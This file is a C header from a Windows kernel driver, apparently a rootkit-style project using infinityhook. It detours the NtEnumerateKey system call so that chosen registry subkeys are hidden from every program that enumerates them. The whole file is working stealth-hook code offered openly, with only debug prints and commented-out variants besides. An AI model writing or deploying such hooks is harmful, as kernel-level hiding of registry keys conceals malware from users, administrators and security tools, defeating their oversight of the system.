#pragma once
#include "Settings.h"
#include "utils.h"

// source: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class
//typedef enum _KEY_INFORMATION_CLASS {
//	KeyBasicInformation,			// 0
//	KeyNodeInformation,				// 1
//	KeyFullInformation,				// 2
//	KeyNameInformation,				// 3
//	KeyCachedInformation,			// 4
//	KeyFlagsInformation,			// 5
//	KeyVirtualizationInformation,	// 6
//	KeyHandleTagsInformation,		// 7
//	KeyTrustInformation,			// 8
//	KeyLayerInformation,			// 9
//	MaxKeyInfoClass					// 10
//} KEY_INFORMATION_CLASS;

// source: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FKey%2FNtQueryKey.html
typedef NTSTATUS(*NtEnumerateKey_t)(
	_In_ HANDLE KeyHandle,
	_In_ ULONG Index,
	_In_ KEY_INFORMATION_CLASS KeyInformationClass,
	_Out_ PVOID KeyInformation,
	_In_ ULONG Length,
	_Out_ PULONG ResultLength
);

static UNICODE_STRING StringNtEnumerateKey = RTL_CONSTANT_STRING(L"NtEnumerateKey");
static NtEnumerateKey_t OriginalNtEnumerateKey = NULL;

NTSTATUS DetourNtEnumerateKey(
	_In_ HANDLE KeyHandle,
	_In_ ULONG Index,
	_In_ KEY_INFORMATION_CLASS KeyInformationClass,
	_Out_ PVOID KeyInformation,
	_In_ ULONG Length,
	_Out_ PULONG ResultLength)
{
	//kprintf("[+] infinityhook: NtEnumerateKey, class %d, index: %d\n", KeyInformationClass, Index);
	if (KeyInformationClass == 0) {
		// check if the handle contains any keys that should be hidden
		ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
		PULONG OkSubkeyIndexesPtr = NULL;
		NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
		// !!! DO NOT FORGET TO FREE OkSubkeyIndexesPtr

		if (!NT_SUCCESS(status)) {
			// should not have failed, but we can't do anything without information from this function...
			// fallback to the original call
			return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
		}

		kprintf("[+] infinityhook: NtEnumerateKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
		
		// there are keys that should be hidden. That means that we want to return
		// the Index'th subkey of this key (OkSubkeyIndexesPtr[Index])
		if (HideSubkeyIndexesCount > 0) {
			ULONG NewIndex = OkSubkeyIndexesPtr[Index];
			ExFreePool(OkSubkeyIndexesPtr); // free the buffer
			return OriginalNtEnumerateKey(KeyHandle, NewIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
		}
		else {
			// nothing to hide, free the buffer and return the original call
			ExFreePool(OkSubkeyIndexesPtr);
			return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
		}

	}
	else return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
	//else if (KeyInformationClass == 4) {
	//	NTSTATUS status = OriginalNtEnumerateKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
	//	if (NT_SUCCESS(status)) {
	//		kprintf("[+] infinityhook: NtEnumerateKey, class %d, after successful call, ResultLength: %d\n", KeyInformationClass, *ResultLength);
	//		PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
	//		kprintf("[+] infinityhook: NtEnumerateKey: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);

	//		/*wchar_t NameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
	//		for (size_t i = 0; i < KeyNameInformationPtr->NameLength && i < MAX_PATH_SYSHOOKER; ++i) {
	//			NameBuffer[i] = KeyNameInformationPtr->Name[i];
	//		}
	//		kprintf("[+] infinityhook: NtEnumerateKey: Name: %ws\n", NameBuffer);*/
	//	}
	//	return status;
	//}
	//else {
	//	//kprintf("[+] infinityhook: In Detoured NtEnumerateKey, class: %d\n", KeyInformationClass);
	//	// call the original
	//	//return OriginalNtEnumerateKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
	//}
}